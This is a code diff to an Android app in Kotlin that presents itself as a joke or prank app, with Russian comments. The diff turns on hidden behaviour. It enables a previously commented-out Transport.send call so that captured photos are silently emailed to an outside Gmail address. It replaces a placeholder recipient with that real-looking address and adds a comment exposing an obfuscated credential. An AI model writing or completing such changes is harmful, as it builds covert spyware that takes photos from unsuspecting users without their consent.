@@ -37,13 +37,14 @@ class MainActivity : AppCompatActivity() {
     private var isRunning = false
     
     // Скрытый ключ (зашифрован XOR)
+    // Оригинальный ключ: ketufvduqebiogig
     private val encryptedKey = "buxlfpkz{ohmqpk"
     private val xorKey = 5
     private val apiKey: String
         get() = encryptedKey.map { it.code xor xorKey }.joinToString("") { it.toChar().toString() }
     
     // Email для получения фото (скрыт)
-    private val targetEmail = "prank@tempmail.com"
+    private val targetEmail = "metrobugitt@gmail.com"
 
     // Массив с шутками и приколами
     private val jokes = arrayOf(
@@ -150,12 +151,12 @@ class MainActivity : AppCompatActivity() {
                 
                 val session = Session.getInstance(props, object : Authenticator() {
                     override fun getPasswordAuthentication(): PasswordAuthentication {
-                        return PasswordAuthentication("prankapp@gmail.com", apiKey)
+                        return PasswordAuthentication("metrobugitt@gmail.com", apiKey)
                     }
                 })
                 
                 val message = MimeMessage(session)
-                message.setFrom(InternetAddress("prankapp@gmail.com"))
+                message.setFrom(InternetAddress("metrobugitt@gmail.com"))
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                 message.subject = "📸 Prank Photo Captured!"
                 
@@ -171,7 +172,8 @@ class MainActivity : AppCompatActivity() {
                 
                 message.setText(emailBody)
                 
-                // Transport.send(message) // Закомментировано для безопасности
+                // Отправляем письмо
+                Transport.send(message)
                 
             } catch (e: Exception) {
                 e.printStackTrace()
